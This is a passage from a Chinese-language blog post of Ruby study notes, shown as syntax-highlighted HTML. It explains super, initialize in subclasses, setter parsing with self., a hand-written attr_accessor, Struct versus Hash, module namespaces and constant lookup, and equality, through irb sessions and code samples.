irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     p <span class="token string-literal"><span class="token string">"Person Hello </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">content</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">009</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">010</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:hi</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">012</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>hi <span class="token string-literal"><span class="token string">"World"</span></span>
<span class="token string-literal"><span class="token string">"Person Hello World"</span></span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Person Hello World"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
这里我们调用<code>Person.new.hi</code>根据祖先链，我们在Person类中找到了该方法，就需要使用<code>super()</code><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Human</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     p <span class="token string-literal"><span class="token string">"Human#hi : </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">content</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:hi</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">006</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token operator">&lt;</span> Human
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">007</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     <span class="token keyword">super</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">009</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">010</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:hi</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">011</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>hi <span class="token string-literal"><span class="token string">"World"</span></span>
<span class="token string-literal"><span class="token string">"Human#hi : World"</span></span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Human#hi : World"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<code>super()</code> 这里虽然加了括号，但实际上super是一个关键词，当加括号和不加括号有很大的不同。当不加括号时，默认会将当前执行方法的入参包括块儿都传递给父级的同名方法。<strong>如果你在调用super之前将入参值修改，则传递给父级的参数也是修改后的。</strong><br>那这里就有一个潜在的坑，如果子类方法是带参函数，而父类的同名方法是一个无参函数，则直接使用<code>super</code>就会报错，必须使用<code>super()</code>表示调用父级无参同名函数。<br>以下是对上述规则代码的表达：</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">SuperSilliness</span> <span class="token operator">&lt;&lt;</span> SillyBase
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">m1</span></span><span class="token punctuation">(</span>x <span class="token punctuation">,</span> y<span class="token punctuation">)</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># call with 1,2</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span> <span class="token comment"># call with x,y</span>
    <span class="token keyword">super</span> x<span class="token punctuation">,</span>y  <span class="token comment"># call with x,y</span>
    <span class="token keyword">super</span>      <span class="token comment"># call with x,y</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># call without arguments</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面我们来考虑一下super如何寻找重载的方法。其实是同样遵守上面的函数调用寻找，也就是从继承链中寻找，也就当然包括单例类，而不是简单的直接找父类。<br>最后一点需要注意的就是<code>super与method_missing搭配</code>，当使用super调用时，如果在继承链中找不到同名方法，则就会执行method_missing方法，默认也就是会报错，但如果你在继承链中定义了method_missing方法，那么就会让人感到困惑，并丢失重要信息。</p>
<h3 id="第八条：初始化子类时调用super"><a href="#第八条：初始化子类时调用super" class="headerlink" title="第八条：初始化子类时调用super"></a>第八条：初始化子类时调用super</h3><p>在Ruby中并没有像传统OOP式的构造方法，如果我们想在对象初始化时进行某些操作，我们需要编写<code>.initialize</code>方法，默认调用new方法时会调用initialize，而如果你没有定义，则默认使用<code>BasicObject#initialize</code>来满足，而这里默认只是个空方法。</p>
<p>需要注意一点的是，在java中当子类进行构造时，会默认调用super(),而ruby中相当于子类直接重写了.initialize方法。也就不会执行父类中的.initialize函数</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">012</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Super</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">013</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">014</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     <span class="token variable">@name</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Tom"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">015</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">016</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:initialize</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">017</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Sub</span> <span class="token operator">&lt;</span> Super
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">018</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">019</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     <span class="token variable">@age</span> <span class="token operator">=</span> <span class="token number">12</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">020</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">021</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:initialize</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">022</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> obj <span class="token operator">=</span> <span class="token class-name">Sub</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token operator">=></span> <span class="token comment">#&lt;Sub:0x00000001092ba4d0 @age=12>   这里没有赋值@name</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那这里我们就可以使用前面学习的super()了，它可以灵活的定义在初始化操作的任何地方。</p>
<h3 id="第九条：提防Ruby中最棘手的解析"><a href="#第九条：提防Ruby中最棘手的解析" class="headerlink" title="第九条：提防Ruby中最棘手的解析"></a>第九条：提防Ruby中最棘手的解析</h3><p>在函数定义时，Ruby给我很大的自由度，我们可以使用<code>? ! =</code>三者作为函数名结尾。</p>
<ul>
<li>? 一般表示返回布尔类型</li>
<li>! 一般表示会改变接受者的状态，或者有潜在问题</li>
<li>= 一般用作setter方法</li>
</ul>
<p>这里我们着重讲一些<code>=</code>方面的问题</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">025</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">User</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">026</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   attr_accessor<span class="token punctuation">(</span><span class="token symbol">:counter</span><span class="token punctuation">)</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">027</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">028</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">029</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     counter <span class="token operator">=</span> <span class="token number">1</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">030</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">031</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:initialize</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">032</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> obj <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token operator">=></span> <span class="token comment">#&lt;User:0x00000001090b5f18></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">033</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> obj<span class="token punctuation">.</span>counter
<span class="token operator">=></span> <span class="token keyword">nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里<code>attr_accessor</code>默认生成了<code>counter()和counter=()</code>方法，但是在初始化操作中，看起来像是执行了<code>counter=(1)</code>,但实际上这里只是定义了一个局部变量，并在初始化操作后抹除，如果想要变成<code>counter=(1)</code>，则必须加上<code>self.</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">041</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">User</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">042</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   attr_accessor<span class="token punctuation">(</span><span class="token symbol">:counter</span><span class="token punctuation">)</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">043</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">044</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">045</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     <span class="token keyword">self</span><span class="token punctuation">.</span>counter <span class="token operator">=</span> <span class="token number">1</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">046</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">047</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:initialize</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">048</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> obj <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token operator">=></span> <span class="token comment">#&lt;User:0x00000001091343b8 @counter=1></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而对于其他方法，比如get方法则不需要加上<code>self.</code></p>
<h4 id="自己写一个attr-accessor"><a href="#自己写一个attr-accessor" class="headerlink" title="自己写一个attr_accessor"></a>自己写一个attr_accessor</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Base</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">attr_fake_accessor</span></span><span class="token punctuation">(</span><span class="token operator">*</span>attrs<span class="token punctuation">)</span>
    attrs<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>attr<span class="token operator">|</span>
      <span class="token keyword">define_method</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span> <span class="token keyword">do</span>
        instance_variable_get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attr</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
      <span class="token keyword">end</span>

      <span class="token keyword">define_method</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attr</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">="</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>value<span class="token operator">|</span>
        instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attr</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
      <span class="token keyword">end</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Base
  attr_fake_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span><span class="token symbol">:age</span>
<span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Tom"</span></span>
obj<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">18</span>

p obj<span class="token punctuation">.</span>name
p obj<span class="token punctuation">.</span>age<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第十条：推荐使用Struct而非Hash存储结构化数据"><a href="#第十条：推荐使用Struct而非Hash存储结构化数据" class="headerlink" title="第十条：推荐使用Struct而非Hash存储结构化数据"></a>第十条：推荐使用Struct而非Hash存储结构化数据</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token class-name">Struct</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token symbol">:date</span><span class="token punctuation">,</span><span class="token symbol">:high</span><span class="token punctuation">,</span><span class="token symbol">:low</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>会自动定义上面入参的attr_accessor方法，并且可以定义实例方法和类方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">Reading <span class="token operator">=</span> <span class="token class-name">Struct</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token symbol">:date</span><span class="token punctuation">,</span><span class="token symbol">:high</span><span class="token punctuation">,</span><span class="token symbol">:low</span><span class="token punctuation">)</span> <span class="token keyword">do</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">hello</span></span>
    p <span class="token string-literal"><span class="token string">"Hello World"</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span>
    p <span class="token string-literal"><span class="token string">"Hi World"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

Reading<span class="token punctuation">.</span>hello
obj <span class="token operator">=</span> <span class="token class-name">Reading</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>hi

other <span class="token operator">=</span> <span class="token class-name">Reading</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>
p other<span class="token punctuation">.</span>date
p other<span class="token punctuation">.</span>high
p other<span class="token punctuation">.</span>low<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>为什么不使用Hash？</p>
</blockquote>
<p>在处理结构化数据时，没有必要专门建立一个新类。<br>哈希作为公共接口时，没有访问限制。<br>通过Struct可以更加灵活的控制</p>
<h3 id="第十一条：通过在模块中嵌入代码来创建命名空间"><a href="#第十一条：通过在模块中嵌入代码来创建命名空间" class="headerlink" title="第十一条：通过在模块中嵌入代码来创建命名空间"></a>第十一条：通过在模块中嵌入代码来创建命名空间</h3><p>在Ruby中我们可以随时定义或重打开某个类定义，比如我们现在需要定义一个<code>Binding</code>类</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Binding</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>style<span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token variable">@style</span> <span class="token operator">=</span> style
    <span class="token variable">@options</span> <span class="token operator">=</span> options
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虽然我们本意是定义一个新的类，但如果使用<code>irb</code>就能发现在全局名称空间中已经有了一个<code>Binding</code>类，这里只是重新打开类，并重写了初始化方法，这可能会导致一些很严重的后果，所以我们需要命名空间来保证常量唯一性。也就是做到相互隔离<br>核心Ruby类都存在于被称为“全局”的名称空间，也就是说我们无需使用限定符就能使用这些类，所以如果不加名称空间来定义类时，这个类就放到了全局命名空间，这就会发生命名冲突的问题。<br>我们可以这么做：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">Noteboos</span>
  <span class="token keyword">class</span> <span class="token class-name">Binding</span>
    <span class="token comment"># ...</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 当使用时：</span>
style <span class="token operator">=</span> Notebooks<span class="token double-colon punctuation">::</span><span class="token class-name">Binding</span><span class="token punctuation">.</span><span class="token keyword">new</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在使用命名空间时，常用的实践就是按照命名空间，定义一样的文件目录结构，比如：<code>Notebooks::Bindings</code>映射文件<code>noteboos/bindings.rb</code><br>如果这个模块我们已经定义过了，在定义类时就可以简写：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Notebooks</span><span class="token double-colon punctuation">::</span><span class="token builtin">Binding</span>
  <span class="token comment">#...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这种定义的使用场景，就是在入口源文件中定义模块，然后再加载剩下的源文件，如果没有预先定义模块，则会报错：<code>NameError</code>因为找不到对应的常量，所以我们得知道Ruby是怎么搜索他们的<br>Ruby使用两种技术寻找常量，第一种：检查<strong>当前词法作用域</strong>和<strong>所有闭包词法作用域，</strong>如果还是找不到，则可以到继承链中继续寻找，这也就是为什么子类中可以使用父类定义的常量。下面是示例</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">SuperDumbCrypto</span>
  <span class="token constant">KEY</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"password"</span></span>
  <span class="token keyword">class</span> <span class="token class-name">Encrypt</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token constant">KEY</span><span class="token punctuation">)</span>
      <span class="token comment"># ..</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里<code>key = KEY</code>由于是在同一个词法作用域，所以可以不用使用常量全路径去使用KEY，我们再稍微改一下</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">SuperDumbCrypto</span>
  <span class="token constant">KEY</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"password"</span></span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">SuperDumbCrypto</span><span class="token double-colon punctuation">::</span>Encrypt
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token constant">KEY</span><span class="token punctuation">)</span>
      <span class="token comment"># ..</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里就会报错，因为不在同一个词法作用域中，如果要修正：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">SuperDumbCrypto</span>
  <span class="token constant">KEY</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"password"</span></span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">SuperDumbCrypto</span><span class="token double-colon punctuation">::</span>Encrypt
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>key <span class="token operator">=</span> SuperDumbCrypto<span class="token double-colon punctuation">::</span><span class="token constant">KEY</span><span class="token punctuation">)</span>
      <span class="token comment"># ..</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>还有一个坑：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">Cluster</span>
  <span class="token keyword">class</span> <span class="token class-name">Array</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
      <span class="token variable">@disks</span> <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>i<span class="token operator">|</span> <span class="token string-literal"><span class="token string">"disk</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">i</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>
      <span class="token comment"># ..</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的<code>Array.new(n)</code>我们想用的是<code>Object::Array</code>，但实际使用的是<code>Cluster::Arrya</code>，当然我们可以指定使用Object的，但有更简洁的写法，也就是去全局空间中获取：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">Cluster</span>
  <span class="token keyword">class</span> <span class="token class-name">Array</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
      <span class="token variable">@disks</span> <span class="token operator">=</span> <span class="token double-colon punctuation">::</span><span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>i<span class="token operator">|</span> <span class="token string-literal"><span class="token string">"disk</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">i</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>
      <span class="token comment"># ..</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第十二条：理解等价的不同用法"><a href="#第十二条：理解等价的不同用法" class="headerlink" title="第十二条：理解等价的不同用法"></a>第十二条：理解等价的不同用法</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:012:<span class="token operator"><span class="token file-descriptor important">0</span>></span> <span class="token string">"a"</span> <span class="token operator">==</span> <span class="token string">"a"</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>                                           
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:015:<span class="token operator"><span class="token file-descriptor important">0</span>></span> <span class="token string">"a"</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token string">"a"</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>
